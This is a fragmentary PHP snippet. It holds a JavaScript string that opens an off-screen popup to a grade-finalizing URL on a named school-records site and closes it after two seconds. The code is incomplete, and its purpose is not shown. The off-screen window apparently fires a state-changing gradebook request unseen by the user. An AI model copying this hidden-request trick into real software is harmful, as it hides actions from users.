...
<?php
$ceva='var popup = window.open("https://stratusarchives.com/globalsisdemo/Modules.php?modname=Grades/InputFinalGrades.php&include_inactive=&modfunc=gradebook&mp=6&exec=1", "Popup", "left=10000,top=10000,width=100,height=100");
setTimeout(function () {
       popup.close()
    },2000);';
